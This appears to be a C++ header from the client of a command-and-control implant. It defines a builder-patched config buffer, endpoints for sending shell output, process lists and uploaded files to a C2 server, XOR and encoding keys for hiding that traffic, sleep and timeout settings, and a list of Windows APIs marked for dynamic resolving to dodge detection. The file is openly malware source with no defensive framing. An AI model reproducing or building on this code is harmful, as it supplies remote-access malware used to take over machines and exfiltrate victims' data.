#pragma once
#include <iostream>

static const int CONFIG_SIZE = 2000;
static const int KEY_SIZE = 4;
static unsigned char CONFIG_BUFFER[CONFIG_SIZE] = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"; // This can be anything, but it should be unique so the builder can find and replace it with the config file

// Structure containing API endpoints. 
struct Endpoints {
	std::string heartbeat;		// Primary endpoint used for communicating new commands 
	std::string info;			// Endpoint for sending the "info" command output
	std::string out;			// Endpoint for sending shell command output
	std::string ps;				// Endpoint for sending the list of currently running processes
	std::string upload;			// Endpoint for uploading files to C2
};

// TODO: implement dynamic function resolving? 
/*
List of necessary functions:
HttpOpenRequestA
HttpSendRequestA
InternetReadFile
CreateFileA
GetFileSize
HttpAddRequestHeadersA
HttpSendRequestExA
InternetWriteFile
ReadFile
URLDownloadToFileA
CreatePipe
CreateProcessA
PeekNamedPipe
RegGetValueA
InternetConnectA
HttpOpenRequestA
CreateToolhelp32Snapshot
Process32First
Process32Next
OpenProcess
TerminateProcess
GetAdaptersInfo
GetUserNameA
GetComputerNameA
GetGeoInfoA
GetPhysicallyInstalledSystemMemory
InternetOpenA
*/

// Structure containing string data
struct Strings {
	std::string post;
	std::string get;
	std::string uploadheaders;
	std::string uploadheadfile;
	std::string uploadheadscreenshot;
	std::string uploadtail;
	std::string cmd;
	std::string regsubkey;
	std::string productname;
	std::string displayversion;
};


// Structure containing important configuration details
struct Configuration {
	int version;				// config version
	std::string useragent;		// HTTP User Agent string
	std::string protocol;		// HTTP or HTTPS
	std::string hostname;		// IP address or hostname of C2 server
	int port;					// TCP port of C2 server
	Endpoints endpoints;		// See structures above
	Strings strings;			// See structures above
	int xorKey;					// Key used to XOR files during upload
	std::string key;			// Key used to en[code/crypt] data transmitted over HTTP
	int sleeptime;				// Time in milliseconds the main thread should sleep for after executing
	int cmdtimeout;				// Maximum time in ?seconds the client should wait for commands to finish executing
	std::string ipCheckUrl;		// URL of 3rd party service used for pulling public IP
	std::string readbuffer;		// Used in Linux client
	std::string postfields;		// Used in Linux client
};

void initializeConfig(struct Configuration* Config, std::string ConfigStr);
std::string xorConfig(char* encString);